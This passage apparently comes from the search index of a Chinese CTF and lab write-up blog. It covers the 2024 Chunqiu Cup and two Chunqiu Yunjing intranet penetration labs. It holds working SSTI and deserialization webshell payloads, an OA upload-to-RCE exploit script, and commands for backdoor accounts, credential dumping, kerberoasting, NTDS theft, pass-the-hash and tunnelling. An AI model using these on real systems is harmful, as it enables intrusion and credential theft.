b3oDOzaIhyCrcO65AkEApZJjxmMk0AB8ZUkhIqw+2gD4N5SPisae+aFfLgLt14H4 VwSZxl2kRs7yhZGl5spFlxdotym3YS/30aY3/+3GPQJBAKWSY8ZjJNAAfGVJISKs PtoA+DeUj4rG","date":"2025-01-20","objectID":"/2024cqbdjs/:2:9","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#nethttp"},{"categories":["wp"],"content":"\rEzMisc(这道题最终只有1解，参考官方wp) 题目内容：某公司网络安全管理员小王截获了一段公司内部向外传输信息的流量，请分析并获取传输的内容 题目提示：1、利⽤DP泄露来求出私钥，从⽽还原私钥流解密密⽂ 2、图片经过了Arnold变换 分析流量包，发现是FTP传输文件的，共下载了三个文件，分别导出一下 RSA私钥，flag.7z，enc 其中私钥是残缺的，利用DP泄露来求出私钥，从而还原私钥流解密密文 -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAs+6Ep8SasbhvIG62iRgAqppC7E6xtM3edPdn654H0IIJcr3T sis8OO5JcElSHhJkCkT1xtRgHm1zVyPIpzZTPZY3vMgN+xTuDwn7roPrMJ9oYhUE 8Yt3lBGotOyZh7/fSq/hd9IATqmO3gTgBzQFFPKK+NLHhidYYEkbg7Mj2TCaSOZO Ztka7LsPfjnr2bo/h3MvJAx86REDO2FXvJAhY9A/ViBatq0pGKD/LioHkwafjd2r xQA3Sjnur8LxOWeM9nNZkZR4DH/kkxHLKxslRePGkOHbLgwIO9bdplhI1ky7gQpC Q3moi74VPd88jnngyAftGqm2h0Mw2jVZgwz6RQIDAQABAoIBAENuo1aAjv0Fwtfj xhLw5OcK8wO+pki9Up6BTff2fLU+1q2iyKCgJWysmOc1A0pz1/wlRfrjArbEjBJf Pca0zFNrZa4hR2QOvvzx39nSZKUPSL5hZD3l58WdLJ3JgexnExbZfWU7VZQlZX59 Uzw/2Zu1HjIMRGxZeHx1SZN84nV1aMj/9FFlpC54ZG0mz33BsmphKnQTYLlINzQl laL6ZR5N+/3QoIGj+TNIHkUQhFCR9d285FWIUWEmhh9UE8UwFPw+gaDcrOcVpSpT hAapMbzBuZ8AAAAAAAAAKLpJRp1+1TmSOtj/eO4sxKXOMdEH1weFCzBUogIKK0H6 VJt6DG0CgYEA7oQV+b31O418CJ3ehDlSjFy3+KdxEXpDujgwP5dwbCenHDNEfx0Y +TzknEC+A/azdn+AhOQyQAE4xGwygb8i2OPC3ZqOhv26yGhv5WZxG2qsQVMCZYD0 +FCmf656TA2rwx6yRf5UtVBecIhSoUkEekxO0lbiBAAAAAAAAAsmadcCgYEAwR8P IEpv47T1jla9RTQuSby4eSu3OvrN/SkKPVFui/aDUG/OO0fQzGuEq2rthtXuGBna Qjvyd+PZngYLn8vHKqmuxAlNUivq3rvGwpayRL83Pts02+4fOa/p7TJkdLlQDHxo La7sn/SiuAAAAAAAAAeFlii6mTG+kUZ98n3IEUMCgYEAlyQaLNSjpqYkV+16CL2u QoWqiqXIL3QToNhkMpfLRK3n5iXSnN4aai2dDCq2fhqBZHCtRwi3kvlzOHz7kF5H PbsuS3DaKk50YvRTG8HLoLz7BLYOSbXrBcNNjpFIrBLpqc4018evc+nGvnaULeHw NXNPa1hlCNFXgJ4+ne3f/KcCgYEAu0KerDUBoc8KfGbnSH98ksuIJRaaqXog22Y8 I5EenGEAm7KOSzUr5cwr7PvWLnSqVnxbAvaV+mLZ1T0PcHdsPJYkfLp4W0FykV+L L4xod/jiXPS5oLiZVpqZPgMrHXPDhxfq/MEteTAAAAAAAAApzN0kj6IWrg1qN/we jFAi+3kCgYABKVPNcN25ZT/FjL4uLKhyu3Q6vgPRQwP//bPlTloenxDT8RN3znpx qzv0e84HQH5lH/AxNix5eq/apOi8B0q6IW1Fj3ytczR8cvPhCln/zWV/ZXxj6Rul JR3mGGh3lYDqiTxi+6ZbKqbhc4N7na8VHx+CoAGMqRUFzAAAAAAAAA== -----END RSA PRIVATE KEY----- import gmpy2 from Crypto.Util.number import long_to_bytes e = 0x10001 n = 0x00b3ee84a7c49ab1b86f206eb6891800aa9a42ec4eb1b4cdde74f767eb9e07d0820972bdd3b22b3c38ee497049521e12640a44f5c6d4601e6d735723c8a736533d9637bcc80dfb14ee0f09fbae83eb309f68621504f18b779411a8b4ec9987bfdf4aafe177d2004ea98ede04e007340514f28af8d2c786275860491b83b323d9309a48e64e66d91aecbb0f7e39ebd9ba3f87732f240c7ce911033b6157bc902163d03f56205ab6ad2918a0ff2e2a0793069f8dddabc500374a39eeafc2f139678cf673599194780c7fe49311cb2b1b2545e3c690e1db2e0c083bd6dda65848d64cbb810a424379a88bbe153ddf3c8e79e0c807ed1aa9b6874330da3559830cfa45 dp = 0x0097241a2cd4a3a6a62457ed7a08bdae4285aa8aa5c82f7413a0d8643297cb44ade7e625d29cde1a6a2d9d0c2ab67e1a816470ad4708b792f973387cfb905e473dbb2e4b70da2a4e7462f4531bc1cba0bcfb04b60e49b5eb05c34d8e9148ac12e9a9ce34d7c7af73e9c6be76942de1f035734f6b586508d157809e3e9deddffca7 for x in range(1,e): #遍历X if (dp*e-1)%x==0: p=(dp*e-1)//x +1 if n%p==0: q=n//p #得到q phi=(p-1)*(q-1) #欧拉函数 d=gmpy2.invert(e,phi) #求逆元 print(d) 解密得到密文为M1sc_1s_s0_e@sy! import gmpy2 from Crypto.Cipher import PKCS1_OAEP from Crypto.PublicKey import RSA e = 0x10001 n = 0xb3ee84a7c49ab1b86f206eb6891800aa9a42ec4eb1b4cdde74f767eb9e07d0820972bdd3b22b3c38ee497049521e12640a44f5c6d4601e6d735723c8a736533d9637bcc80dfb14ee0f09fbae83eb309f68621504f18b779411a8b4ec9987bfdf4aafe177d2004ea98ede04e007340514f28af8d2c786275860491b83b323d9309a48e64e66d91aecbb0f7e39ebd9ba3f87732f240c7ce911033b6157bc902163d03f56205ab6ad2918a0ff2e2a0793069f8dddabc500374a39eeafc2f139678cf673599194780c7fe49311cb2b1b2545e3c690e1db2e0c083bd6dda65848d64cbb810a424379a88bbe153ddf3c8e79e0c807ed1aa9b6874330da3559830cfa45 d = 0x436ea356808efd05c2d7e3c612f0e4e70af303bea648bd529e814df7f67cb53ed6ada2c8a0a0256cac98e735034a73d7fc2545fae302b6c48c125f3dc6b4cc536b65ae2147640ebefcf1dfd9d264a50f48be61643de5e7c59d2c9dc981ec671316d97d653b559425657e7d533c3fd99bb51e320c446c59787c7549937ce2757568c8fff45165a42e78646d26cf7dc1b26a612a741360b94837342595a2fa651e4dfbfdd0a081a3f933481e4510845091f5ddbce45588516126861f5413c53014fc3e81a0dcace715a52a538406a931bcc1b99f269282083dc86f28ba49469d7ed539923ad8ff78ee2cc4a5ce","date":"2025-01-20","objectID":"/2024cqbdjs/:2:10","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#ezmisc"},{"categories":["wp"],"content":"\rweb","date":"2025-01-20","objectID":"/2024cqbdjs/:3:0","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#web"},{"categories":["wp"],"content":"\reasy_flask题目内容：想想flask！！ payload {{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat flag').read()\")}} 发包 GET /?user=%7b%7b''.__class__.__base__.__subclasses__()%5b80%5d.__init__.__globals__%5b'__builtins__'%5d.eval(%22__import__('os').popen('cat%20flag').read()%22)%7d%7d HTTP/1.1 Host: 123.56.4.173:37054 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://123.56.4.173:37054/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: close ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:3:1","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#easy_flask"},{"categories":["wp"],"content":"\rfile_copy题目内容：file copy 确定flag位置 ​ 随后使用filters_chain_oracle_exploit.py脚本一把梭 ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:3:2","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#file_copy"},{"categories":["wp"],"content":"\reasy_ser题目内容：简单的反序列化来哩 构造序列化 \u003c?php class STU{ public $stu; } class SDU{ public $Dazhuan; } class CTF{ public $filename='b.php'; } $sdu=new SDU(); $stu=new STU(); $ctf=new CTF(); $sdu-\u003eDazhuan=$stu; $stu-\u003estu=$ctf; $ctf-\u003ehackman=\"PD89YGNhdCAvZipgOw==\"; echo serialize($sdu); post发包传入 O:3:\"SDU\":1:{s:7:\"Dazhuan\";O:3:\"STU\":1:{s:3:\"stu\";O:3:\"CTF\":2:{s:8:\"filename\";s:5:\"b.php\";s:7:\"hackman\";s:20:\"PD89YGNhdCAvZipgOw==\";}}} ​ 访问/b.shell得到flag ​ ‍ ","date":"2025-01-20","objectID":"/2024cqbdjs/:3:3","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#easy_ser"},{"categories":["penetration","wp"],"content":"春秋云境-Privilege综合渗透通关wp 靶标介绍：在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。 Wordpress Gitlab Kerberos 内网渗透 Privilege Elevation ‍ ","date":"2025-01-14","objectID":"/chunqiuyunjing-privilege/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Privilege综合渗透","uri":"/chunqiuyunjing-privilege/#"},{"categories":["penetration","wp"],"content":"\r第一关关卡剧情： 请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\\ProgramData\\Jenkins.jenkins。 fscan扫描 [root@iZ2ze file]# ./fscan -h 39.99.137.59 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan 39.99.137.59:445 open 39.99.137.59:135 open 39.99.137.59:80 open 39.99.137.59:139 open 39.99.137.59:3306 open 39.99.137.59:8080 open [*] alive ports len is: 6 start vulscan [*] NetInfo [*]39.99.137.59 [-\u003e]XR-JENKINS [-\u003e]172.22.14.7 [*] WebTitle http://39.99.137.59:8080 code:403 len:548 title:None [*] WebTitle http://39.99.137.59 code:200 len:54646 title:XR SHOP [+] PocScan http://39.99.137.59/www.zip poc-yaml-backup-file 已完成 6/6 [*] 扫描结束,耗时: 44.104825753s 发现源码备份http://39.99.137.59/www.zip，访问拿到源码 在wp-config.php文件中发现数据库账号密码，尝试连接不成功，应该是不允许其他主机连接 tools/content-log.php​下发现了存在任意文件读取漏洞 根据题目描述我们获取到了Jekins根目录为C:\\ProgramData\\Jenkins\\.jenkins​，然后我们这里搜索过后可以发现初始密码路径 读取C:\\ProgramData\\Jenkins\\.jenkins\\secrets\\initialAdminPassword​ http://39.99.137.59/tools/content-log.php?logfile=../../../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword ​ 访问http://39.99.137.59:8080/，进行登录 admin/510235cf43f14e83b88a9f144199655b 发现groovy脚本执行接口 ​ 进行添加用户 println \"net user ttest Test@123 /add\".execute().text println \"net localgroup administrators ttest /add\".execute().text rdp连上去，读取flag01 ​ ","date":"2025-01-14","objectID":"/chunqiuyunjing-privilege/:0:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-Privilege综合渗透","uri":"/chunqiuyunjing-privilege/#第一关"},{"categories":["penetration","wp"],"content":"\r第二关关卡剧情：管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。 上传fscan，frp，扫内网，搭代理 ​ fscan C:\\Users\\ttest\\Downloads\u003efscan.exe -h 172.22.14.7/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan (icmp) Target 172.22.14.7 is alive (icmp) Target 172.22.14.11 is alive (icmp) Target 172.22.14.16 is alive (icmp) Target 172.22.14.31 is alive (icmp) Target 172.22.14.46 is alive [*] Icmp alive hosts len is: 5 172.22.14.11:445 open 172.22.14.7:445 open 172.22.14.7:135 open 172.22.14.46:139 open 172.22.14.31:139 open 172.22.14.11:139 open 172.22.14.46:135 open 172.22.14.31:135 open 172.22.14.7:139 open 172.22.14.11:135 open 172.22.14.46:80 open 172.22.14.16:80 open 172.22.14.7:80 open 172.22.14.16:22 open 172.22.14.16:8060 open 172.22.14.11:88 open 172.22.14.46:445 open 172.22.14.31:445 open 172.22.14.7:8080 open 172.22.14.31:1521 open 172.22.14.7:3306 open 172.22.14.16:9094 open [*] alive ports len is: 22 start vulscan [*] NetInfo [*]172.22.14.7 [-\u003e]XR-JENKINS [-\u003e]172.22.14.7 [*] NetInfo [*]172.22.14.46 [-\u003e]XR-0923 [-\u003e]172.22.14.46 [*] NetInfo [*]172.22.14.11 [-\u003e]XR-DC [-\u003e]172.22.14.11 [*] NetInfo [*]172.22.14.31 [-\u003e]XR-ORACLE [-\u003e]172.22.14.31 [*] NetBios 172.22.14.46 XIAORANG\\XR-0923 [*] NetBios 172.22.14.31 WORKGROUP\\XR-ORACLE [*] NetBios 172.22.14.11 [+] DC:XIAORANG\\XR-DC [*] WebTitle http://172.22.14.7:8080 code:403 len:548 title:None [*] WebTitle http://172.22.14.16:8060 code:404 len:555 title:404 Not Found [*] WebTitle http://172.22.14.7 code:200 len:54603 title:XR SHOP [*] WebTitle http://172.22.14.46 code:200 len:703 title:IIS Windows Server [*] WebTitle http://172.22.14.16 code:302 len:99 title:None 跳转url: http://172.22.14.16/users/sign_in [*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961 title:Sign in · GitLab [+] PocScan http://172.22.14.7/www.zip poc-yaml-backup-file 已完成 22/22 其中 172.22.14.7 （XR-JENKINS）（已经拿下） 172.22.14.46 （XR-0923） 172.22.14.11 （XR-DC） 172.22.14.31 （XR-ORACLE） 172.22.14.16 （GitLab） gitlab在http://172.22.14.16 frp穿透出来 根据关卡剧情获取到API token ​ ​ 回到脚本控制台获取对应的明文，获得gitlab PRIVATE-TOKENgitlab PRIVATE-TOKEN （无法将其push到github，只能转为图片push） println(hudson.util.Secret.fromString(\"{上述字符串}\").getPlainText()) ​ glpat-7kD_qLH2PiQv_ywB9hz2 （极狐API信息泄露） 使用 Access Token 去请求 GitLab API，返回所有的项目列表： proxychains4 curl --header \"PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2\" \"http://172.22.14.16/api/v4/projects\" |jq |grep \"http_url_to_repo\" ​ git clone下来 proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/gitlab-instance-23352f48/Monitoring.git 在xradmin/ruoyi-admin/src/main/resources/application-druid.yml找到Oracle的账密 ​ url: jdbc:oracle:thin:@172.22.14.31:1521/orcl username: xradmin password: fcMyE8t9E4XdsKf 用odat打oracle proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user ttest Test@123 /add' proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup administrators ttest /add' ​ 随后rdp连过去读flag ​ ","date":"2025-01-14","objectID":"/chunqiuyunjing-privilege/:0:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-Privilege综合渗透","uri":"/chunqiuyunjing-privilege/#第二关"},{"categories":["penetration","wp"],"content":"\r第三关关卡剧情：攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。 在internal-secret/credentials.txt里找到XR-0923的账密 ​ zhangshuai/wSbEajHzZs ​ rdp连过去之后发现权限较低，无法读取flag net user zhangshuai ​ 发现zhangshuai是Remote Management Use组的 可以参考https://forum.butian.net/share/2080 使用evil-winrm​连接此机器 proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs ​ whoami /priv 可以发现再查看用户权限，发现多了一个SeRestorePrivilege​ SeRestorePrivilege提权,参考: https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8 可以了解到SeRestorePrivilege​授予对系统上所有对象的写访问权，而不管它们的ACL如何。此时我们就可以通过三种方式达到滥用特权的目的： 1、修改服务二进制文件 2、覆盖系统进程使用的DLL 3、修改注册表设置 尝试粘滞键提权 ren C://windows/system32/sethc.exe C://windows/system32/sethc.bak ren C://windows/system32/cmd.exe C://windows/system32/sethc.exe 回到rdp锁定用户，在登录处按5下shift触发粘滞键弹出cmd拿到SYSTEM ​ 随后切换到对应目录读取flag ​ ","date":"2025-01-14","objectID":"/chunqiuyunjing-privilege/:0:3","series":null,"tags":["penetration","wp"],"title":"春秋云境-Privilege综合渗透","uri":"/chunqiuyunjing-privilege/#第三关"},{"categories":["penetration","wp"],"content":"\r第四关关卡剧情：尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。 创建个管理员用户rdp上去 net user ttest Test@123 /add net localgroup administrators ttest /add 传个猕猴桃上去，以管理员权限运行导出哈希 privilege::debug sekurlsa::logonpasswords ​ 拿到XR-0923$的ntlm哈希 b76b9e077e8d1f117310a4e1eb50be45 ​ 打kerberoasting proxychains4 impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes ':a5ac13ae0abc9935a13e81c88f638494' -dc-ip 172.22.14.11 ​ 抓取tianjing的hash，写入hash.txt proxychains4 impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes ':a5ac13ae0abc9935a13e81c88f638494' -dc-ip 172.22.14.11 -request-user tianjing ​ 使用hashcat进行密码爆破 hashcat -a 0 -m 13100 hash.txt rockyou.txt 得到tianjing密码是DPQSXSXgh2 ​ evil-winrm​连一下 proxychains4 evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 whoami /priv查看用户权限，发现又多一个SeBackupPrivilege ​ kali上新建一个raj.dsh，内容如下 set context persistent nowriters add volume c: alias raj create expose %raj% z: 再用unix2dos将dsh文件的编码间距转换为Windows兼容的编码和间距 unix2dos raj.dsh 在C:/​下随便创个目录，上传raj.dsh ​ 卷影拷贝 diskshadow /s raj.dsh ​ 下载ntds.dit和system到kali上 RoboCopy /b z:\\windows\\ntds . ntds.dit download ntds.dit reg save HKLM\\SYSTEM system download system ​ ​ 解密出administrator的hash impacket-secretsdump -ntds ntds.dit -system system local ​ 打pth，winrm上去 proxychains4 evil-winrm -i 172.22.14.11 -u Administrator -H \"70c39b547b7d8adec35ad7c09fb1d277\" ​ 到对应位置读取flag ​ ","date":"2025-01-14","objectID":"/chunqiuyunjing-privilege/:0:4","series":null,"tags":["penetration","wp"],"title":"春秋云境-Privilege综合渗透","uri":"/chunqiuyunjing-privilege/#第四关"},{"categories":["penetration","wp"],"content":"春秋云境-Initial综合渗透通关wp 靶标介绍：Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。 DCSync CVE 域渗透 ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#"},{"categories":["penetration","wp"],"content":"\r外网打点起手fscan E:\\Tools\\web\\fscan_v1.82\u003efscan64.exe -h 39.98.121.15 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.2 start infoscan (icmp) Target 39.98.121.15 is alive [*] Icmp alive hosts len is: 1 39.98.121.15:22 open 39.98.121.15:80 open [*] alive ports len is: 2 start vulscan [*] WebTitle: http://39.98.121.15 code:200 len:5578 title:Bootstrap Material Admin [+] http://39.98.121.15 poc-yaml-thinkphp5023-method-rce poc1 已完成 2/2 发现thinkphp的rce漏洞 直接getshell发现回连不成功 在vps上起http.server，靶机执行wget下载冰蝎马 连接成功 ​ ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:1:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#外网打点"},{"categories":["penetration","wp"],"content":"\r提权但权限比较低，尝试提权 /var/www/html/ \u003ewhoami www-data /var/www/html/ \u003e 上传信息收集脚本LinEnum.sh并执行，发现了有sudo提权，命令是mysql ​ 去GTFOBins查一下 ​ sudo mysql -e '\\! /bin/sh' 随后 find / -name *flag* ​ ​ ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:1:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#提权"},{"categories":["penetration","wp"],"content":"\rflag01flag{60b53231- ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:1:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#flag01"},{"categories":["penetration","wp"],"content":"\r内网渗透","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#内网渗透"},{"categories":["penetration","wp"],"content":"\r信息收集 www-data@ubuntu-web01:/var/www/html$ ifconfig ifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 172.22.1.15 netmask 255.255.0.0 broadcast 172.22.255.255 inet6 fe80::216:3eff:fe04:448 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:16:3e:04:04:48 txqueuelen 1000 (Ethernet) RX packets 127464 bytes 159592057 (159.5 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 34792 bytes 14822017 (14.8 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 2048 bytes 173247 (173.2 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2048 bytes 173247 (173.2 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 fscan www-data@ubuntu-web01:/var/www/html$ ./fscan -h 172.22.1.15/24 ./fscan -h 172.22.1.15/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan trying RunIcmp2 The current user permissions unable to send icmp packets start ping (icmp) Target 172.22.1.2 is alive (icmp) Target 172.22.1.15 is alive (icmp) Target 172.22.1.18 is alive (icmp) Target 172.22.1.21 is alive [*] Icmp alive hosts len is: 4 172.22.1.2:88 open 172.22.1.2:135 open 172.22.1.18:3306 open 172.22.1.18:80 open 172.22.1.21:445 open 172.22.1.15:80 open 172.22.1.18:445 open 172.22.1.2:445 open 172.22.1.15:22 open 172.22.1.21:139 open 172.22.1.18:139 open 172.22.1.2:139 open 172.22.1.21:135 open 172.22.1.18:135 open [*] alive ports len is: 14 start vulscan [*] NetInfo [*]172.22.1.21 [-\u003e]XIAORANG-WIN7 [-\u003e]172.22.1.21 [*] NetInfo [*]172.22.1.18 [-\u003e]XIAORANG-OA01 [-\u003e]172.22.1.18 [*] NetInfo [*]172.22.1.2 [-\u003e]DC01 [-\u003e]172.22.1.2 [*] WebTitle http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin [*] NetBios 172.22.1.2 [+] DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] OsInfo 172.22.1.2 (Windows Server 2016 Datacenter 14393) [+] MS17-010 172.22.1.21 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1) [*] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] WebTitle http://172.22.1.18 code:302 len:0 title:None 跳转url: http://172.22.1.18?m=login [*] WebTitle http://172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统 [+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1 已完成 14/14 该内网网段有四台主机，其中一台已被拿下，另外三台 172.22.1.2 DC 172.22.1.21 MS17-010 172.22.1.18 信呼OA 接下来先打信呼OA，我们接下来上传frp到主机上，让内网的流量转发出来。 ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#信息收集"},{"categories":["penetration","wp"],"content":"\rfrp穿透vps frps.ini [common] bind_port = 7000 ‍ 靶机 frpc.ini [common] server_addr = vps.ip server_port = 7000 [socks5] type = tcp remote_port = 6000 plugin = socks5 ‍ 本地proxifier ​ ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#frp穿透"},{"categories":["penetration","wp"],"content":"\r信呼协同办公系统漏洞利用现存漏洞可搜 [代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客 ​ 利用exp： import requests session = requests.session() url_pre = 'http://172.22.1.18/' url1 = url_pre + '?a=check\u0026m=login\u0026d=\u0026ajaxbool=true\u0026rnd=533953' url2 = url_pre + '/index.php?a=upfile\u0026m=upload\u0026d=public\u0026maxsize=100\u0026ajaxbool=true\u0026rnd=798913' url3 = url_pre + '/task.php?m=qcloudCos|runt\u0026a=run\u0026fileid=11' data1 = { 'rempass': '0', 'jmpass': 'false', 'device': '1625884034525', 'ltype': '0', 'adminuser': 'YWRtaW4=', 'adminpass': 'YWRtaW4xMjM=', 'yanzm': '' } r = session.post(url1, data=data1) r = session.post(url2, files={'file': open('1.php', 'br+')}) filepath = str(r.json()['filepath']) filepath = \"/\" + filepath.split('.uptemp')[0] + '.php' id = r.json()['id'] url3 = url_pre + f'/task.php?m=qcloudCos|runt\u0026a=run\u0026fileid={id}' r = session.get(url3) r = session.get(url_pre + filepath + \"?1=system('dir\") print(r.text) print(filepath) 上面的adminuser和adminpass都是base64编码过后的，然后我们再在同级目录下来个要上传的木马，命名为1.php，直接运行脚本，然后拿到返回的路径，直接连behinder。 PS C:\\Users\\scofi\\Desktop\u003e python solve.py \u003cbr /\u003e \u003cb\u003eNotice\u003c/b\u003e: Undefined offset: 1 in \u003cb\u003eC:\\phpStudy\\PHPTutorial\\WWW\\upload\\2025-01\\12_11282757.php\u003c/b\u003e on line \u003cb\u003e23\u003c/b\u003e\u003cbr /\u003e /upload/2025-01/12_11282757.php upload\\2025-01\\12_11282757.php ​ 文件管理 ​ ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:3","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#信呼协同办公系统漏洞利用"},{"categories":["penetration","wp"],"content":"\rflag022ce3-4813-87d4- 根据提示，接下来打DC ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:4","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#flag02"},{"categories":["penetration","wp"],"content":"\rDC域控渗透配置kali vm的proxychains4 nano /etc/proxychains4.conf 我的vm用的是NAT网络模式，添加 socks5 vps_ip 6000 同时模式为dynamic_chain​ 随后使用msf proxychains msfconsole use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp show options set rhosts 